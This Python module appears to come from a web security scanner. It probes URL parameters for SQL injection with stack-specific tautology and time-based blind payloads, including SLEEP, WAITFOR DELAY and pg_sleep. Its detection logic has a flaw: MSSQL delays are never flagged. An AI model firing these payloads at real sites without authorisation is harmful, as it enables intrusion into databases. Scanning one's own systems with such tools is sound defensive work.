"""Smart (AI-Heuristic) SQL Injection Module - Adapts payloads based on technology detection."""
import requests
import re
from urllib.parse import urlparse, parse_qs, urlencode

def test_ai_sqli(url):
    """
    Advanced SQLi detection that adapts payloads to the detected target technology.
    """
    findings = []
    try:
        # 1. Fingerprint the technology
        resp = requests.get(url, timeout=10)
        headers = resp.headers
        server = headers.get('Server', '').lower()
        powered_by = headers.get('X-Powered-By', '').lower()
        body = resp.text.lower()

        tech = 'generic'
        if 'php' in powered_by or 'php' in server:
            tech = 'php_mysql'
        elif 'asp.net' in powered_by or 'microsoft' in server:
            tech = 'mssql'
        elif 'postgres' in body or 'npgsql' in body:
            tech = 'postgresql'
        elif 'sqlite' in body:
            tech = 'sqlite'

        # 2. Select optimized payloads based on tech
        payload_map = {
            'php_mysql': [
                "' OR 1=1 -- -",
                '" OR 1=1 -- -',
                "' OR '1'='1' #",
                "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", # Time-based
            ],
            'mssql': [
                "' OR 1=1--",
                "'; WAITFOR DELAY '0:0:5'--", # Time-based
            ],
            'postgresql': [
                "'; SELECT pg_sleep(5)--", # Time-based
                "' OR 1=1--",
            ],
            'sqlite': [
                "' OR 1=1--",
                "\" OR 1=1--",
            ],
            'generic': [
                "' OR 1=1--",
                "' OR '1'='1",
            ]
        }

        payloads = payload_map.get(tech, payload_map['generic'])
        
        # 3. Perform testing
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for param_name in params:
            for payload in payloads:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param_name] = payload
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"

                try:
                    import time
                    start_time = time.time()
                    test_resp = requests.get(test_url, timeout=15)
                    duration = time.time() - start_time

                    # Check for time-based blind SQLi (if duration > 4 seconds)
                    if tech != 'generic' and 'sleep' in payload.lower() and duration > 4.5:
                        findings.append({
                            'type': 'ai_sqli',
                            'severity': 'critical',
                            'description': f'AI Detection: Time-based Blind SQLi in "{param_name}"',
                            'details': f'The application appears vulnerable to Blind SQLi on {tech} stack. Injecting "{payload}" caused a delay of {duration:.2f} seconds.',
                            'solution': 'Use parameterized queries immediately. The application is leaking database execution time.'
                        })
                        break

                    # Standard error-based check (inherited but smart)
                    if any(p in test_resp.text for p in ['SQL syntax', 'mysql_', 'SqlException', 'sqlite3.OperationalError']):
                        findings.append({
                            'type': 'ai_sqli',
                            'severity': 'high',
                            'description': f'AI Detection: Technology-specific SQLi in "{param_name}"',
                            'details': f'Confirmed SQL Injection vulnerability on {tech} stack using payload: {payload}',
                            'solution': 'Implement strong input validation and use prepared statements.'
                        })
                        break
                except requests.exceptions.RequestException:
                    continue

    except Exception as e:
        pass

    return findings
